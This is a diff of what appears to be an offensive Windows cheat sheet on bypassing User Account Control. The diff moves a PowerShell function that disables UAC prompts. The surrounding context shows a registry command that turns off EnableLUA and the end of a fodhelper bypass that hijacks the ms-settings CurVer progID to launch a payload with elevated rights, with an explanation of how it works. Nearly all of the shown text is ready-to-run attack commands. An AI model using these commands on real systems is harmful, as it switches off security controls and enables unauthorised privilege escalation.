@@ -38,6 +38,16 @@ whoami /groups | findstr Level
 cmd> reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /d 0 /t REG_DWORD
 ```
 
+## PowerShell Disable UAC
+```
+Powershell disable UAC
+Disable UAC
+function Disable-UserAccessControl {
+    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 00000000
+    Write-Host "User Access Control (UAC) has been disabled." -ForegroundColor Green    
+}
+```
+
 ## Fodhelper
 ```
 Fodhelper
@@ -125,16 +135,6 @@ C:\> Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(defaul
 C:\> Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
 So, what this script does is create a new progID with the name “.hack” and then directly associate the payload with the command used when opening such files. which then points the CurVer entry of ms-settings to our “.hack” progID. When fodhelper tries opening an ms-settings program, it will instead be pointed to the “.hack” program ID and use its associated command. 
-```
-
-## PowerShell Disable UAC
-```
-Powershell disable UAC
-Disable UAC
-function Disable-UserAccessControl {
-    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 00000000
-    Write-Host "User Access Control (UAC) has been disabled." -ForegroundColor Green    
-}
 ```
 
 ## msconfig    
